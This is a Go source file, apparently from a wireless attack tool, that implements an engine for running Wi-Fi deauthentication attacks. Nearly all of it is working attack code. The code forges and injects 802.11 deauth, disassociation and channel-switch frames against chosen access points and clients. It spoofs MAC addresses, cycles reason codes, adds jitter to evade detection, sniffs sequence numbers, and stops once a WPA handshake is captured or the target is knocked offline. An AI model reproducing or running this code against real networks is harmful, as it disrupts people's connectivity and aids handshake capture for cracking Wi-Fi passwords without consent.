package deauth

import (
	"context"
	"crypto/rand"
	"errors"
	"fmt"
	mrand "math/rand"
	"net"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/capture"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/driver"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/injection"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
	"github.com/lcalzada-xor/wmap/internal/telemetry"
)

// Common errors
var (
	ErrTargetMACRequired    = errors.New("target MAC is required")
	ErrClientMACRequired    = errors.New("client MAC is required for unicast/targeted attack")
	ErrMaxConcurrentReached = errors.New("maximum concurrent attacks reached")
	ErrAttackNotFound       = errors.New("attack not found")
	ErrAttackNotActive      = errors.New("attack is not active")
	ErrNoInjectorAvailable  = errors.New("no injector available")
)

// effectivenessMonitor encapsulates attack effectiveness monitoring logic
type effectivenessMonitor struct {
	events     chan string
	ctx        context.Context
	cancel     context.CancelFunc
	logger     func(string, string)
	targetMAC  string
	attackID   string
	controller *AttackController
}

// newEffectivenessMonitor creates a new effectiveness monitor
func newEffectivenessMonitor(ctx context.Context, controller *AttackController, logger func(string, string)) *effectivenessMonitor {
	monitorCtx, monitorCancel := context.WithCancel(ctx)
	return &effectivenessMonitor{
		events:     make(chan string, 10),
		ctx:        monitorCtx,
		cancel:     monitorCancel,
		logger:     logger,
		targetMAC:  controller.Config.TargetMAC,
		attackID:   controller.ID,
		controller: controller,
	}
}

// start begins monitoring with the given injector
func (m *effectivenessMonitor) start(injector *injection.Injector) {
	go injector.StartMonitor(m.ctx, m.targetMAC, m.events)
	go m.processEvents()
}

// processEvents handles monitoring events
func (m *effectivenessMonitor) processEvents() {
	for {
		select {
		case <-m.ctx.Done():
			return
		case event := <-m.events:
			m.handleEvent(event)
		}
	}
}

// handleEvent processes a single monitoring event
func (m *effectivenessMonitor) handleEvent(event string) {
	switch event {
	case "handshake":
		if m.logger != nil {
			m.logger(fmt.Sprintf("Handshake captured for attack %s! Stopping.", m.attackID), "success")
		}
		m.controller.mu.Lock()
		m.controller.Status.HandshakeCaptured = true
		m.controller.mu.Unlock()
		m.controller.CancelFn()

	case "probe":
		if m.logger != nil {
			m.logger(fmt.Sprintf("Target %s sent Probe Request - CONFIRMED DISCONNECTION", m.targetMAC), "success")
		}

	case "disconnected":
		if m.logger != nil {
			m.logger(fmt.Sprintf("Target %s silenced (No data >3s) - EFFECTIVE DISCONNECTION", m.targetMAC), "success")
		}
		m.controller.mu.Lock()
		m.controller.Status.Status = domain.AttackStopped
		m.controller.mu.Unlock()
		m.controller.CancelFn()
	}
}

// stop stops the monitor
func (m *effectivenessMonitor) stop() {
	m.cancel()
}

// AttackController manages the lifecycle of a single deauth attack
type AttackController struct {
	ID       string
	Config   domain.DeauthAttackConfig
	Status   domain.DeauthAttackStatus
	CancelFn context.CancelFunc
	StatusCh chan domain.DeauthAttackStatus
	mu       sync.RWMutex
	injector *injection.Injector // Dedicated injector for this attack (if specific interface used)
}

// DeauthEngine manages multiple concurrent deauth attacks
type DeauthEngine struct {
	injector          *injection.Injector
	activeAttacks     map[string]*AttackController
	mu                sync.RWMutex
	maxConcurrent     int
	locker            capture.ChannelLocker
	logger            func(string, string) // Message, Level ("info", "warning", "danger", "success")
	monitoringEnabled bool
}

// NewDeauthEngine creates a new deauth attack engine
func NewDeauthEngine(injector *injection.Injector, locker capture.ChannelLocker, maxConcurrent int) *DeauthEngine {
	if maxConcurrent <= 0 {
		maxConcurrent = 5 // Default max concurrent attacks
	}
	return &DeauthEngine{
		injector:          injector,
		activeAttacks:     make(map[string]*AttackController),
		maxConcurrent:     maxConcurrent,
		locker:            locker,
		monitoringEnabled: true,
	}
}

// SetLogger sets the callback for logging events
func (e *DeauthEngine) SetLogger(logger func(string, string)) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.logger = logger
}

// log sends a message to the logger callback asynchronously
func (e *DeauthEngine) log(message string, level string) {
	e.mu.RLock()
	logger := e.logger
	e.mu.RUnlock()

	if logger != nil {
		go logger(message, level)
	}
}

// validateConfig validates the attack configuration
func (e *DeauthEngine) validateConfig(config domain.DeauthAttackConfig) error {
	if config.TargetMAC == "" {
		return ErrTargetMACRequired
	}

	if config.AttackType == domain.DeauthUnicast || config.AttackType == domain.DeauthTargeted {
		if config.ClientMAC == "" {
			return fmt.Errorf("%w: %s", ErrClientMACRequired, config.AttackType)
		}
	}

	return nil
}

// prepareInjector selects or creates an injector for the attack
// Returns: (attackInjector, dedicatedInjector, error)
func (e *DeauthEngine) prepareInjector(config *domain.DeauthAttackConfig) (*injection.Injector, *injection.Injector, error) {
	// Set default interface if not specified
	if config.Interface == "" && e.injector != nil {
		config.Interface = e.injector.Interface
	}

	// Use default injector if no specific interface requested
	if config.Interface == "" {
		return e.injector, nil, nil
	}

	// Reuse default injector if it matches the requested interface
	if e.injector != nil && e.injector.Interface == config.Interface {
		e.log(fmt.Sprintf("Reusing default injector for interface %s", config.Interface), "info")
		return e.injector, nil, nil
	}

	// Set channel if specified
	if config.Channel > 0 {
		if err := driver.SetInterfaceChannel(config.Interface, config.Channel); err != nil {
			e.log(fmt.Sprintf("Warning: Failed to set channel %d on %s: %v", config.Channel, config.Interface, err), "warning")
		} else {
			e.log(fmt.Sprintf("Set channel %d on %s", config.Channel, config.Interface), "info")
		}
	}

	// Create dedicated injector for this interface
	inj, err := injection.NewInjector(config.Interface)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to create injector for interface %s: %w", config.Interface, err)
	}

	return inj, inj, nil
}

// checkConcurrentLimit checks if we can start a new attack
func (e *DeauthEngine) checkConcurrentLimit() error {
	e.mu.RLock()
	defer e.mu.RUnlock()

	if len(e.activeAttacks) >= e.maxConcurrent {
		return fmt.Errorf("%w (%d)", ErrMaxConcurrentReached, e.maxConcurrent)
	}

	return nil
}

// registerAttack adds a new attack controller to the active attacks map
func (e *DeauthEngine) registerAttack(controller *AttackController) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.activeAttacks[controller.ID] = controller
}

// StartAttack initiates a new deauth attack
func (e *DeauthEngine) StartAttack(ctx context.Context, config domain.DeauthAttackConfig) (string, error) {
	// Cleanup finished attacks first
	e.CleanupFinished()

	// Validate configuration
	if err := e.validateConfig(config); err != nil {
		return "", err
	}

	// Check concurrent limit
	if err := e.checkConcurrentLimit(); err != nil {
		return "", err
	}

	// Prepare injector
	attackInjector, dedicatedInjector, err := e.prepareInjector(&config)
	if err != nil {
		return "", err
	}

	// Create attack context and controller
	attackID := uuid.New().String()
	attackCtx, cancel := context.WithCancel(ctx)
	statusCh := make(chan domain.DeauthAttackStatus, 10)

	controller := &AttackController{
		ID:       attackID,
		Config:   config,
		CancelFn: cancel,
		StatusCh: statusCh,
		injector: dedicatedInjector,
		Status: domain.DeauthAttackStatus{
			ID:          attackID,
			Config:      config,
			Status:      domain.AttackPending,
			PacketsSent: 0,
			StartTime:   time.Now(),
		},
	}

	// Register attack
	e.registerAttack(controller)

	// Start attack execution
	go e.runAttack(attackCtx, controller, attackInjector)

	e.log(fmt.Sprintf("Started attack %s: Type=%s Target=%s Interface=%s",
		attackID, config.AttackType, config.TargetMAC, config.Interface), "success")

	return attackID, nil
}

// cleanupAttackResources ensures all attack resources are properly cleaned up
func (e *DeauthEngine) cleanupAttackResources(controller *AttackController) {
	controller.mu.Lock()
	defer controller.mu.Unlock()

	if controller.injector != nil {
		controller.injector.Close()
		controller.injector = nil
	}
}

// handleAttackPanic recovers from panics and updates attack status
func (e *DeauthEngine) handleAttackPanic(controller *AttackController) {
	if r := recover(); r != nil {
		e.log(fmt.Sprintf("Attack %s CRASHED: %v", controller.ID, r), "danger")

		controller.mu.Lock()
		controller.Status.Status = domain.AttackFailed
		controller.Status.ErrorMessage = fmt.Sprintf("panic: %v", r)
		now := time.Now()
		controller.Status.EndTime = &now
		controller.mu.Unlock()

		controller.CancelFn()
	}
}

// executeAttack performs the actual attack execution
func (e *DeauthEngine) executeAttack(ctx context.Context, controller *AttackController, injector *injection.Injector) error {
	if injector == nil {
		return ErrNoInjectorAvailable
	}

	// Update status to running
	controller.mu.Lock()
	controller.Status.Status = domain.AttackRunning
	controller.mu.Unlock()

	// Setup effectiveness monitoring
	fmt.Printf("DEBUG: monitoringEnabled=%v\n", e.monitoringEnabled)
	if e.monitoringEnabled {
		monitor := newEffectivenessMonitor(ctx, controller, e.log)
		monitor.start(injector)
		defer monitor.stop()
	}

	// Execute attack based on type
	if controller.Config.PacketCount == 0 {
		// Continuous attack
		return e.runContinuousAttack(ctx, controller, injector)
	}

	// Burst attack
	if err := e.runBurstAttack(ctx, controller, injector); err != nil {
		return err
	}

	// Update burst completion status
	controller.mu.Lock()
	controller.Status.PacketsSent = controller.Config.PacketCount
	controller.Status.Status = domain.AttackStopped
	controller.mu.Unlock()

	e.log(fmt.Sprintf("Attack %s: Burst finished (%d packets)", controller.ID, controller.Config.PacketCount), "success")
	return nil
}

// runAttack executes the attack logic with proper resource management
func (e *DeauthEngine) runAttack(ctx context.Context, controller *AttackController, injector *injection.Injector) {
	// Ensure cleanup and panic recovery
	defer e.cleanupAttackResources(controller)
	defer e.handleAttackPanic(controller)

	// Define attack action
	action := func() error {
		return e.executeAttack(ctx, controller, injector)
	}

	// Execute with or without channel lock
	var err error
	if e.locker != nil && controller.Config.Channel > 0 {
		e.log(fmt.Sprintf("Channel %d locked on %s for attack", controller.Config.Channel, controller.Config.Interface), "info")
		err = e.locker.ExecuteWithLock(ctx, controller.Config.Interface, controller.Config.Channel, action)
	} else {
		err = action()
	}

	// Update final status
	e.updateFinalStatus(controller, err)
}

// updateFinalStatus updates the attack status after completion
func (e *DeauthEngine) updateFinalStatus(controller *AttackController, err error) {
	controller.mu.Lock()
	defer controller.mu.Unlock()

	now := time.Now()

	if err != nil {
		e.log(fmt.Sprintf("Attack %s failed: %v", controller.ID, err), "error")
		controller.Status.Status = domain.AttackFailed
		controller.Status.ErrorMessage = err.Error()
	} else {
		if controller.Status.Status == domain.AttackRunning {
			controller.Status.Status = domain.AttackStopped
		}
		e.log(fmt.Sprintf("Attack %s completed", controller.ID), "info")
	}

	controller.Status.EndTime = &now
}

// StopAttack stops a running attack
func (e *DeauthEngine) StopAttack(ctx context.Context, id string, force bool) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return fmt.Errorf("%w: %s", ErrAttackNotFound, id)
	}

	controller.mu.Lock()
	defer controller.mu.Unlock()

	if !force && controller.Status.Status != domain.AttackRunning && controller.Status.Status != domain.AttackPaused {
		return fmt.Errorf("%w: %s (status: %s)", ErrAttackNotActive, id, controller.Status.Status)
	}

	// Cancel context
	controller.CancelFn()

	// Close dedicated injector if exists
	if controller.injector != nil {
		controller.injector.Close()
		controller.injector = nil
	}

	// Update status
	controller.Status.Status = domain.AttackStopped
	now := time.Now()
	controller.Status.EndTime = &now
	if force {
		controller.Status.ErrorMessage = "Force stopped by user"
	}

	e.log(fmt.Sprintf("Stopped attack %s (force=%v)", id, force), "warning")

	return nil
}

// PauseAttack pauses a running attack (not fully implemented - would need more complex state management)
func (e *DeauthEngine) PauseAttack(id string) error {
	e.mu.RLock()
	defer e.mu.RUnlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return fmt.Errorf("%w: %s", ErrAttackNotFound, id)
	}

	controller.mu.Lock()
	defer controller.mu.Unlock()

	if controller.Status.Status != domain.AttackRunning {
		return fmt.Errorf("attack %s is not running", id)
	}

	// For now, pause is equivalent to stop
	// A full implementation would need pause/resume channels
	controller.CancelFn()
	controller.Status.Status = domain.AttackPaused

	e.log(fmt.Sprintf("Paused attack %s", id), "warning")

	return nil
}

// ResumeAttack resumes a paused attack (placeholder)
func (e *DeauthEngine) ResumeAttack(id string) error {
	e.mu.RLock()
	defer e.mu.RUnlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return fmt.Errorf("%w: %s", ErrAttackNotFound, id)
	}

	controller.mu.Lock()
	defer controller.mu.Unlock()

	if controller.Status.Status != domain.AttackPaused {
		return fmt.Errorf("attack %s is not paused", id)
	}

	// For now, resume would require restarting the attack
	// A full implementation would need more sophisticated state management
	return fmt.Errorf("resume not yet implemented - please start a new attack")
}

// GetAttackStatus returns the current status of an attack
func (e *DeauthEngine) GetAttackStatus(ctx context.Context, id string) (domain.DeauthAttackStatus, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return domain.DeauthAttackStatus{}, fmt.Errorf("%w: %s", ErrAttackNotFound, id)
	}

	controller.mu.RLock()
	defer controller.mu.RUnlock()

	return controller.Status, nil
}

// ListActiveAttacks returns all active attacks
func (e *DeauthEngine) ListActiveAttacks(ctx context.Context) []domain.DeauthAttackStatus {
	e.mu.RLock()
	defer e.mu.RUnlock()

	statuses := make([]domain.DeauthAttackStatus, 0, len(e.activeAttacks))
	for _, controller := range e.activeAttacks {
		controller.mu.RLock()
		statuses = append(statuses, controller.Status)
		controller.mu.RUnlock()
	}

	return statuses
}

// CleanupFinished removes finished attacks from the active list
func (e *DeauthEngine) CleanupFinished() int {
	e.mu.Lock()

	removed := 0
	for id, controller := range e.activeAttacks {
		controller.mu.RLock()
		isFinished := controller.Status.Status == domain.AttackStopped ||
			controller.Status.Status == domain.AttackFailed
		controller.mu.RUnlock()

		if isFinished {
			delete(e.activeAttacks, id)
			removed++
		}
	}
	e.mu.Unlock()

	if removed > 0 {
		e.log(fmt.Sprintf("Cleaned up %d finished attacks", removed), "system")
	}

	return removed
}

// runContinuousAttack executes the continuous deauth loop
func (e *DeauthEngine) runContinuousAttack(ctx context.Context, controller *AttackController, injector *injection.Injector) error {
	config := controller.Config
	// injector passed as argument, safe to use

	// Optimize interface for robustness (Low 'n Slow)
	injector.OptimizeInterfaceForInjection()

	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	packetsSent := 0
	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")

	// Optimized Reason Codes (Psychological Warfare)
	fuzzCodes := []uint16{1, 2, 3, 4, 6, 7}
	fuzzIdx := 0

	// Jitter Function
	getSleepDuration := func() time.Duration {
		if !config.UseJitter {
			return interval
		}
		jitter := time.Duration(mrand.Intn(int(interval)/5*2+1)) - interval/5
		return interval + jitter
	}

	// Sniff Initial Sequence Number
	// We need 'seq' state. Local variable.
	var seq uint16 = uint16(mrand.Intn(4096))
	if !config.SpoofSource && (config.AttackType == domain.DeauthTargeted || config.AttackType == domain.DeauthUnicast) {
		sniffedSeq := injector.SniffSequenceNumber(ctx, targetMAC)
		seq = sniffedSeq
		e.log(fmt.Sprintf("Sniffed Sequence Number from %s: %d", targetMAC, sniffedSeq), "info")
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			currentReason := config.ReasonCode
			if config.UseReasonFuzzing {
				currentReason = fuzzCodes[fuzzIdx]
				fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
			}

			// Determine MACs (Real or Spoofed)
			txMAC_AP := targetMAC
			txMAC_Client := clientMAC
			if config.SpoofSource {
				txMAC_AP = randomMAC()
				txMAC_Client = randomMAC()
			}

			// Logic adaptation:
			// "The Combo": 3 Deauths, then 1 Disassoc
			// In continuous mode, use CSA very rarely (e.g. every 50 packets)
			useCSA := (packetsSent > 0 && packetsSent%50 == 0)
			useDisassoc := (!useCSA && (packetsSent+1)%4 == 0)

			var pkts [][]byte

			switch config.AttackType {
			case domain.DeauthBroadcast:
				var pkt []byte
				if useCSA {
					pkt, _ = injection.SerializeCSAPacket(targetMAC, txMAC_AP, 1, 0, seq)
				} else if useDisassoc {
					pkt, _ = injection.SerializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
				} else {
					pkt, _ = injection.SerializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
				}
				if pkt != nil {
					pkts = append(pkts, pkt)
				}

			case domain.DeauthUnicast:
				if len(clientMAC) > 0 {
					var pkt []byte
					if useCSA {
						pkt, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
					} else if useDisassoc {
						pkt, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
					} else {
						pkt, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
					}
					if pkt != nil {
						pkts = append(pkts, pkt)
					}
				}

			case domain.DeauthTargeted:
				if len(clientMAC) > 0 {
					// 1. AP -> Client
					var pkt1 []byte
					if useCSA {
						pkt1, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
					} else if useDisassoc {
						pkt1, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
					} else {
						pkt1, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
					}
					seq++ // Increment for next packet

					// 2. Client -> AP
					reasonClientToAP := currentReason
					if config.UseReasonFuzzing || config.ReasonCode == 0 {
						reasonClientToAP = 3 // Station Leaving
					}
					var pkt2 []byte
					if useDisassoc {
						pkt2, _ = injection.SerializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
					} else {
						pkt2, _ = injection.SerializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
					}

					if pkt1 != nil {
						pkts = append(pkts, pkt1)
					}
					if pkt2 != nil {
						pkts = append(pkts, pkt2)
					}
				}
			}

			// Inject packets
			for _, p := range pkts {
				if err := injector.Inject(p); err != nil {
					telemetry.InjectionErrors.WithLabelValues(config.Interface, "deauth").Inc()
				} else {
					telemetry.InjectionsTotal.WithLabelValues(config.Interface, "deauth").Inc()
					packetsSent++
				}
			}

			seq++

			// Jitter Sleep
			if config.UseJitter {
				ticker.Reset(getSleepDuration())
			}
		}
	}
}

// runBurstAttack executes a burst deauth attack
func (e *DeauthEngine) runBurstAttack(ctx context.Context, controller *AttackController, injector *injection.Injector) error {
	config := controller.Config
	// injector passed as argument

	// Optimize interface
	injector.OptimizeInterfaceForInjection()

	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	count := config.PacketCount
	if count <= 0 {
		count = 10
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
	fuzzCodes := []uint16{1, 2, 3, 4, 6, 7}
	fuzzIdx := 0

	// Jitter Helper
	getSleepDuration := func() time.Duration {
		if !config.UseJitter {
			return interval
		}
		jitter := time.Duration(mrand.Intn(int(interval)/5*2+1)) - interval/5
		return interval + jitter
	}

	// Sniff Initial Sequence Number
	var seq uint16 = uint16(mrand.Intn(4096))
	if !config.SpoofSource && (config.AttackType == domain.DeauthTargeted || config.AttackType == domain.DeauthUnicast) {
		sniffedSeq := injector.SniffSequenceNumber(ctx, targetMAC)
		seq = sniffedSeq
		e.log(fmt.Sprintf("Sniffed Sequence Number from %s: %d", targetMAC, sniffedSeq), "info")
	}

	for j := 0; j < count; j++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		currentReason := config.ReasonCode
		if config.UseReasonFuzzing {
			currentReason = fuzzCodes[fuzzIdx]
			fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
		}

		txMAC_AP := targetMAC
		txMAC_Client := clientMAC
		if config.SpoofSource {
			txMAC_AP = randomMAC()
			txMAC_Client = randomMAC()
		}

		useCSA := (j == 0)
		useDisassoc := (j > 0 && (j+1)%4 == 0)

		var pkts [][]byte

		switch config.AttackType {
		case domain.DeauthBroadcast:
			var pkt []byte
			if useCSA {
				// Broadcast CSA
				pkt, _ = injection.SerializeCSAPacket(broadcast, txMAC_AP, 1, 0, seq)
			} else if useDisassoc {
				pkt, _ = injection.SerializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
			} else {
				pkt, _ = injection.SerializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
			}
			if pkt != nil {
				pkts = append(pkts, pkt)
			}

		case domain.DeauthUnicast:
			if len(clientMAC) > 0 {
				var pkt []byte
				if useCSA {
					pkt, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
				} else if useDisassoc {
					pkt, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
				} else {
					pkt, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
				}
				if pkt != nil {
					pkts = append(pkts, pkt)
				}
			}

		case domain.DeauthTargeted:
			if len(clientMAC) > 0 {
				var pkt1 []byte
				if useCSA {
					pkt1, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
				} else if useDisassoc {
					pkt1, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
				} else {
					pkt1, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
				}
				seq++

				reasonClientToAP := currentReason
				if config.UseReasonFuzzing || config.ReasonCode == 0 {
					reasonClientToAP = 3
				}
				var pkt2 []byte
				if useDisassoc {
					pkt2, _ = injection.SerializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
				} else {
					pkt2, _ = injection.SerializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
				}

				if pkt1 != nil {
					pkts = append(pkts, pkt1)
				}
				if pkt2 != nil {
					pkts = append(pkts, pkt2)
				}
			}
		}

		for _, p := range pkts {
			if err := injector.Inject(p); err != nil {
				telemetry.InjectionErrors.WithLabelValues(config.Interface, "deauth").Inc()
				e.log(fmt.Sprintf("Failed to inject packet in burst: %v", err), "warning")
			} else {
				telemetry.InjectionsTotal.WithLabelValues(config.Interface, "deauth").Inc()
			}
		}

		seq++

		if j < count-1 {
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(getSleepDuration()):
			}
		}
	}

	return nil
}

// StopAll stops all active attacks
func (e *DeauthEngine) StopAll(ctx context.Context) {
	e.mu.Lock()
	// Collect IDs to avoid deadlock (StopAttack takes the lock again)
	ids := make([]string, 0, len(e.activeAttacks))
	for id := range e.activeAttacks {
		ids = append(ids, id)
	}
	e.mu.Unlock()

	for _, id := range ids {
		if err := e.StopAttack(ctx, id, true); err != nil {
			e.log(fmt.Sprintf("Failed to stop attack %s: %v", id, err), "error")
		}
	}

	e.log("Stopped all attacks", "system")
}

// randomMAC generates a random unicast MAC address
func randomMAC() net.HardwareAddr {
	buf := make([]byte, 6)
	rand.Read(buf)
	// Set locally administered bit (bit 1 of first byte) and unset multicast bit (bit 0)
	buf[0] = (buf[0] | 0x02) & 0xfe
	return net.HardwareAddr(buf)
}
